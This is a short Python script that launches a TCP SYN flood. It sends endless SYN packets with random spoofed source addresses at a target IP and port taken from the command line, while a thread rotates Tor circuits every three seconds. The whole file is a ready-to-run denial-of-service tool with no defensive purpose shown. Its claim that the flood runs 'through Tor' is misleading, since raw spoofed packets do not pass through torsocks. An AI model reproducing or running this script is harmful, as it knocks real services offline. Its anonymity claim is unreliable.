import time
import threading
import sys
from stem import Signal
from stem.control import Controller
from scapy.all import *

TARGET_IP = ""
TARGET_PORT = 0
TOR_PASSWORD = "kalikali"  # replace with the one you used earlier

def change_ip_every_3_seconds():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password=TOR_PASSWORD)
        while True:
            controller.signal(Signal.NEWNYM)
            print("[*] New Tor circuit requested.")
            time.sleep(3)

def syn_flood(target_ip, target_port):
    print(f"[+] Launching TCP SYN flood on {target_ip}:{target_port} through Tor...")
    while True:
        ip = IP(dst=target_ip, src=RandIP())
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        pkt = ip / tcp
        send(pkt, verbose=0)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: sudo torsocks python3 {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    TARGET_IP = sys.argv[1]
    TARGET_PORT = int(sys.argv[2])

    threading.Thread(target=change_ip_every_3_seconds, daemon=True).start()
    syn_flood(TARGET_IP, TARGET_PORT)
